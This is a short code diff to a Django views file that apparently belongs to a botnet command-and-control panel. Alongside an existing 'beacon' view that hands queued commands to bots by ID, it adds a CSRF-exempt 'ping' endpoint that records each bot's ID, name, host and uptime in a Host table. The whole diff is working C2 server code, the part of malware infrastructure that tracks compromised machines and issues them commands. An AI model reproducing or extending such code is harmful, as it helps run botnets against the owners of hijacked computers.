@@ -1,6 +1,6 @@
 from django.shortcuts import render
 from django.views.decorators.csrf import csrf_exempt
-from .models import Bot, Command
+from .models import Bot, Command, Host
 from .forms import cmdForm
 import time, hashlib
 
@@ -47,6 +47,21 @@ def beacon(request):
             context = {'bot' : x.botId, 'cmd' : x.cmd}
             return render(request, 'run.html', context)
     return render(request, 'index.html')
+
+@csrf_exempt
+def ping(request):
+    if request.method == "POST":
+        post = request.POST
+        botId = post.get('botId', False)
+        botName = post.get('botName', False)
+        host = post.get('host', False)
+        up = post.get('up', False)
+        if botId and botName and host and up:
+            h = Host(botId=botId, botName=botName, host=host, up=up)
+            h.save()
+    return render(request, 'index.html')
+
+
 
 def cmd(request):
     if request.method == 'POST':
